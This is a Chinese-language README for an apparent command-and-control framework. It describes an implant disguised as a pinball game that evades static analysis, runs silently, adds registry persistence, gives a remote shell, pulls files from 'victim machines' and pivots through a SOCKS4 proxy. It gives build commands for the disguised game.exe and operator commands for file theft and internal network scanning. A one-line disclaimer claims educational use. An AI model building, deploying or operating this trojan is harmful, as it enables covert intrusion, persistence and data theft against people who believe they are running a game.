# NextGenC2

NextGenC2 是一个现代化的命令与控制（C2）框架，包含基于 React 的前端界面、Node.js 后端服务器，以及伪装成游戏的隐蔽 C 语言植入程序（Implant）。

## ✨ 功能特性

### 🖥️ C2 Server & Web Interface (服务端与Web界面)
- **实时监控**: 实时查看已连接的 Agent 及其状态。
- **交互式 Shell**: 发送 Shell 命令并实时接收执行结果。
- **文件下载**: 支持从受害者机器下载文件 (`download <path>`)。
- **SOCKS4 代理**: 内置 SOCKS4 服务器 (端口 1080)，支持通过 Agent 进行内网穿透 (Pivoting)。
- **持久化管理**: 一键安装/卸载 HKCU/HKLM 注册表启动项。

### 🦠 C Implant (植入程序)
- **伪装执行**: 默认运行“弹球游戏”GUI 窗口，C2 逻辑在后台线程运行。
- **静默模式**: 支持 `--silent` 参数，无界面后台运行。
- **动态 API 解析**: 隐藏导入表（IAT），规避静态分析。
- **通信加密**: 使用 Base64 编码传输文件和代理数据，防止协议被 IDS 识别。
- **多线程架构**: 同时处理 C2 命令、文件传输和多个 SOCKS 代理连接。

## 📂 项目结构

- **`server/`**: Node.js 后端。处理 TCP 连接、Web API、SOCKS 隧道。
- **`client_web/`**: React (Vite) 前端。操作员控制台。
- **`client/`**: C 语言植入程序源码 (`shell_evasive.c`) 及构建脚本。

## 🚀 安装与使用

### 1. 启动服务端 (Server)
```bash
cd server
npm install
node server.js
```
- Web 界面: `http://localhost:3000` (API)
- C2 监听端口: `4444`
- SOCKS4 代理端口: `1080`

### 2. 启动前端 (Web Client)
```bash
cd client_web
npm install
npm run dev
```
- 访问地址: `http://localhost:5173`

### 3. 编译植入程序 (Implant)
**方法 A: 使用构建脚本 (推荐)**
```bash
cd client
python builder.py
# 编译生成的 shell_generated.c
gcc shell_generated.c resource.o -o game.exe -mwindows -lws2_32 -lgdi32
```

**方法 B: 手动编译**
```bash
cd client
# 编译资源文件 (可选)
windres resource.rc -o resource.o
# 编译主程序
gcc shell_evasive.c resource.o -o game.exe -mwindows -lws2_32 -lgdi32
```

### 4. 运行植入程序
- **GUI 模式**: 直接运行 `game.exe`，显示游戏窗口。
- **静默模式**: `game.exe --silent`，无窗口后台运行。

## 🛠️ 进阶功能指南

### 📂 文件下载 (File Download)
在 Web 终端中输入:
```bash
download C:\Users\Public\secret.txt
```
文件将保存到 `server/downloads/` 目录下。

### 🌐 内网穿透 (SOCKS Proxy)
Server 默认监听 `1080` 端口作为 SOCKS4 代理。
配置你的工具 (如 ProxyChains, Firefox) 指向 `127.0.0.1:1080`。

**示例 (ProxyChains):**
1. 编辑 `/etc/proxychains.conf`:
   ```text
   socks4 127.0.0.1 1080
   ```
2. 通过 Agent 扫描内网:
   ```bash
   proxychains nmap -sT -Pn 192.168.1.10
   ```

## ⚠️ 免责声明
本项目仅用于网络安全教育和授权测试。请勿用于非法用途。
# NextC2
